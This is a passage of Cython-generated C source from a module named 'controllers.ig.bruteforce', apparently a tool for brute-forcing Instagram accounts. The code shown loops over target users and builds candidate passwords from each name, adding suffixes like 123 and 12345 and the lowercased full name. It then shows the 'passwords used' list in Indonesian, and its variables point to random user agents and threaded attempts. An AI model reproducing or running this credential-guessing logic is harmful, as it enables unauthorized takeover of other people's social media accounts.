          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__3, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 106, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L20;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L1_error;
    __pyx_L20:;
  }

   

   
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.randoms", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ualist);
  __Pyx_XDECREF(__pyx_v_pool);
  __Pyx_XDECREF(__pyx_v_item);
  __Pyx_XDECREF(__pyx_v_target);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_2start(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_cur_scope;
  PyObject *__pyx_v_rich = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_users = NULL;
  PyObject *__pyx_v_kwargs = NULL;
  PyObject *__pyx_v_password_used = NULL;
  PyObject *__pyx_v_random_user_agent = NULL;
  PyObject *__pyx_v_saved = NULL;
  PyObject *__pyx_v_tips = NULL;
  PyObject *__pyx_v_progress = NULL;
  PyObject *__pyx_v_chunk = NULL;
  PyObject *__pyx_v_target = NULL;
  PyObject *__pyx_v_account = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_loading = 0;
  PyObject *__pyx_v_normal = 0;
  PyObject *__pyx_v_randoms = 0;
  PyObject *__pyx_v_start_time = NULL;
  PyObject *__pyx_v_status = NULL;
  PyObject *__pyx_v_task = NULL;
  PyObject *__pyx_v_thread = NULL;
  PyObject *__pyx_v_end_time = NULL;
  PyObject *__pyx_v_minutes = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  int __pyx_t_18;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("start", 0);
  __pyx_cur_scope = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *)__pyx_tp_new_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start(__pyx_ptype_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 34, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  __pyx_cur_scope->__pyx_v_self = __pyx_v_self;
  __Pyx_INCREF(__pyx_cur_scope->__pyx_v_self);
  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_v_self);

   
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_rich); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_rich = __pyx_t_1;
  __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyObject_RichCompare(__pyx_t_1, __pyx_t_2, Py_EQ); __Pyx_XGOTREF(__pyx_t_3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_4) {

     
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_panel); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_style, __pyx_kp_u_bold_red) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
    __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

     
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_ig_back); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_3 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

     
    __Pyx_XDECREF(__pyx_r);
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;

     
  }

   
  __Pyx_INCREF(__pyx_int_0);
  __pyx_t_3 = __pyx_int_0;
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_copy); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
    __pyx_t_5 = __pyx_t_2; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
    __pyx_t_8 = NULL;
  } else {
    __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 41, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  for (;;) {
    if (likely(!__pyx_t_8)) {
      if (likely(PyList_CheckExact(__pyx_t_5))) {
        if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_2); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 41, __pyx_L1_error)
        #else
        __pyx_t_2 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      } else {
        if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_2); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 41, __pyx_L1_error)
        #else
        __pyx_t_2 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      }
    } else {
      __pyx_t_2 = __pyx_t_8(__pyx_t_5);
      if (unlikely(!__pyx_t_2)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 41, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_2);
    }
    __Pyx_XDECREF_SET(__pyx_v_users, __pyx_t_2);
    __pyx_t_2 = 0;
    __Pyx_INCREF(__pyx_t_3);
    __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_3);
    __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_3, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3);
    __pyx_t_3 = __pyx_t_2;
    __pyx_t_2 = 0;

     
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_utils); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_generate_passsword_from_name); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_name); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = PyTuple_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_9 = PyList_New(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_INCREF(__pyx_int_123);
    __Pyx_GIVEREF(__pyx_int_123);
    PyList_SET_ITEM(__pyx_t_9, 0, __pyx_int_123);
    __Pyx_INCREF(__pyx_int_12345);
    __Pyx_GIVEREF(__pyx_int_12345);
    PyList_SET_ITEM(__pyx_t_9, 1, __pyx_int_12345);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_suflix, __pyx_t_9) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyObject_GetItem(__pyx_t_2, __pyx_v_i); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(PyObject_SetItem(__pyx_t_1, __pyx_n_u_password, __pyx_t_9) < 0)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

     
    __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __pyx_t_1 = __Pyx_PyObject_GetItem(__pyx_t_9, __pyx_v_i); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __pyx_t_9 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_u_password); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_name); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_lower); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_10 = __Pyx_PyObject_Append(__pyx_t_9, __pyx_t_1); if (unlikely(__pyx_t_10 == ((int)-1))) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

     
  }
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

   
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_v_kwargs = ((PyObject*)__pyx_t_3);
  __pyx_t_3 = 0;

   
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_escape); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_1 = PyList_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_nama123);
  __Pyx_GIVEREF(__pyx_n_u_nama123);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_nama123);
  __Pyx_INCREF(__pyx_n_u_nama12345);
  __Pyx_GIVEREF(__pyx_n_u_nama12345);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_nama12345);
  __Pyx_INCREF(__pyx_kp_u_nama_lengkap_akun);
  __Pyx_GIVEREF(__pyx_kp_u_nama_lengkap_akun);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_nama_lengkap_akun);
  __pyx_t_9 = PyUnicode_Join(__pyx_kp_u__5, __pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_1, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_9);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_password_used = __pyx_t_3;
  __pyx_t_3 = 0;

   
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_panel); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_INCREF(__pyx_v_password_used);
  __Pyx_GIVEREF(__pyx_v_password_used);
  PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_password_used);
  __Pyx_INCREF(__pyx_n_u_theme);
  __Pyx_GIVEREF(__pyx_n_u_theme);
  PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_u_theme);
  __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_justify, __pyx_n_u_center) < 0) __PYX_ERR(0, 47, __pyx_L1_error)
  __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_6, __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_11);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_11);
  __pyx_t_11 = 0;
  __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_title, __pyx_kp_u_Sandi_Digunakan) < 0) __PYX_ERR(0, 47, __pyx_L1_error)
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_2, __pyx_t_11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_11 = NULL;
  __pyx_t_12 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_11)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_11);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
      __pyx_t_12 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_5)) {
    PyObject *__pyx_temp[4] = {__pyx_t_11, __pyx_kp_u__6, __pyx_t_6, __pyx_kp_u__6};
    __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
    PyObject *__pyx_temp[4] = {__pyx_t_11, __pyx_kp_u__6, __pyx_t_6, __pyx_kp_u__6};
    __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  } else
  #endif
  {
    __pyx_t_2 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (__pyx_t_11) {
      __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_11); __pyx_t_11 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_kp_u__6);
    PyTuple_SET_ITEM(__pyx_t_2, 0+__pyx_t_12, __pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 1+__pyx_t_12, __pyx_t_6);
    __Pyx_INCREF(__pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_kp_u__6);
    PyTuple_SET_ITEM(__pyx_t_2, 2+__pyx_t_12, __pyx_kp_u__6);
    __pyx_t_6 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

   
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_confirm); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_ask); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_5)) {
